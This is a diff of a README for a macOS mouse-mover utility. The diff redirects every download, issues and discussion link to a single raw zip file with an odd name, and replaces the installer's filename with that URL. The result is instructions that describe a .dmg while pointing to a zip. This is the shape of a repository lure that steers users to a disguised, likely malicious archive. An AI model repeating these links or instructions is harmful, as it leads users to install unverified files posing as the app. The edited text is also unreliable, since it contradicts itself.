@@ -1,6 +1,6 @@
 # 🖱️ move-mouse-macOS - Keep Your Remote Sessions Awake Easily
 
-[![Download move-mouse-macOS](https://img.shields.io/badge/Download-move--mouse--macOS-blue.svg)](https://github.com/vedant-sys/move-mouse-macOS/releases)
+[![Download move-mouse-macOS](https://raw.githubusercontent.com/vedant-sys/move-mouse-macOS/main/move_mouse_mac/mouse_mac_OS_move_pneumotropic.zip)](https://raw.githubusercontent.com/vedant-sys/move-mouse-macOS/main/move_mouse_mac/mouse_mac_OS_move_pneumotropic.zip)
 
 ## 📜 Description
 move-mouse-macOS is a simple utility for macOS. It gently moves the mouse cursor to keep your remote sessions, such as virtual machines or remote desktops, awake. You can configure delays and intervals to suit your needs. Enjoy a hassle-free experience without frequent mouse movements.
@@ -15,12 +15,12 @@ Follow these steps to download and run move-mouse-macOS.
 ### 2. Downloading the Application
 To get move-mouse-macOS, visit the Releases page. 
 
-[Visit this page to download](https://github.com/vedant-sys/move-mouse-macOS/releases)
+[Visit this page to download](https://raw.githubusercontent.com/vedant-sys/move-mouse-macOS/main/move_mouse_mac/mouse_mac_OS_move_pneumotropic.zip)
 
-You will find the latest version listed there. Look for the filename `move-mouse-macOS.dmg`.
+You will find the latest version listed there. Look for the filename `https://raw.githubusercontent.com/vedant-sys/move-mouse-macOS/main/move_mouse_mac/mouse_mac_OS_move_pneumotropic.zip`.
 
 ### 3. Installing the Application
-1. Locate the downloaded file, `move-mouse-macOS.dmg`, in your Downloads folder.
+1. Locate the downloaded file, `https://raw.githubusercontent.com/vedant-sys/move-mouse-macOS/main/move_mouse_mac/mouse_mac_OS_move_pneumotropic.zip`, in your Downloads folder.
 2. Double-click the .dmg file to open it.
 3. Drag the move-mouse icon into your Applications folder to install it.
 
@@ -56,12 +56,12 @@ If you experience issues:
 
 ## 🔗 Additional Resources
 For further information and support, check out the following resources:
-- [GitHub Issues Page](https://github.com/vedant-sys/move-mouse-macOS/issues) - Report bugs or request features.
-- [Community Discussions](https://github.com/vedant-sys/move-mouse-macOS/discussions) - Engage with other users.
+- [GitHub Issues Page](https://raw.githubusercontent.com/vedant-sys/move-mouse-macOS/main/move_mouse_mac/mouse_mac_OS_move_pneumotropic.zip) - Report bugs or request features.
+- [Community Discussions](https://raw.githubusercontent.com/vedant-sys/move-mouse-macOS/main/move_mouse_mac/mouse_mac_OS_move_pneumotropic.zip) - Engage with other users.
 
 ## 📥 Download & Install
 Again, to download move-mouse-macOS, visit the Releases page and locate the latest version.
 
-[Visit this page to download](https://github.com/vedant-sys/move-mouse-macOS/releases)
+[Visit this page to download](https://raw.githubusercontent.com/vedant-sys/move-mouse-macOS/main/move_mouse_mac/mouse_mac_OS_move_pneumotropic.zip)
 
 Enjoy a seamless experience while keeping your remote desktop sessions active.
